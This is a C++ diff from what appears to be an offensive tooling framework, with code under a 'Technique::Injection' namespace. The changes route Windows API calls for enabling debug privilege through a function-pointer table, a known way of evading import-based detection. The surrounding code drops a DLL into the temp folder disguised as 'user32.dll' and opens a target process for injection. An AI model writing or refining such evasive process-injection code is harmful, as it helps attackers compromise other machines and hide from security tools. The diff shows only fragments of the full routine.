@@ -95,7 +95,7 @@ namespace Technique::Injection
 
         // Set the temp file path
         std::wstring wDllFileName = L"user32.dll"; // Impersonate the file name.
-        std::wstring wDllPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + wDllFileName;
+        std::wstring wDllPath = System::Env::GetStrings(pProcs, L"%TEMP%") + L"\\" + wDllFileName;
         size_t dwDllPathSize = (wDllPath.size() + 1) * sizeof(wchar_t);
 
         // Write DLL file
@@ -106,15 +106,17 @@ namespace Technique::Injection
 
         HANDLE hToken;
         TOKEN_PRIVILEGES priv = {0};
-        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        if (pProcs->lpOpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         {
             priv.PrivilegeCount = 1;
             priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-            if (LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
-                AdjustTokenPrivileges(hToken, FALSE, &priv, 0, nullptr, nullptr);
+            if (pProcs->lpLookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+            {
+                pProcs->lpAdjustTokenPrivileges(hToken, FALSE, &priv, 0, nullptr, nullptr);
+            }
 
-            CloseHandle(hToken);
+            pProcs->lpCloseHandle(hToken);
         }
 
         hProcess = System::Process::ProcessOpen(
@@ -229,15 +231,17 @@ namespace Technique::Injection
 
         HANDLE hToken;
         TOKEN_PRIVILEGES priv = {0};
-        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        if (pProcs->lpOpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         {
             priv.PrivilegeCount = 1;
             priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-            if (LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
-                AdjustTokenPrivileges(hToken, FALSE, &priv, 0, nullptr, nullptr);
+            if (pProcs->lpLookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+            {
+                pProcs->lpAdjustTokenPrivileges(hToken, FALSE, &priv, 0, nullptr, nullptr);
+            }
 
-            CloseHandle(hToken);
+            pProcs->lpCloseHandle(hToken);
         }
 
         HANDLE hProcess = System::Process::ProcessOpen(
@@ -317,5 +321,7 @@ namespace Technique::Injection
         System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
         System::Handle::HandleClose(pProcs, hProcess);
         System::Handle::HandleClose(pProcs, hThread);
+
+        return TRUE;
     }
 }
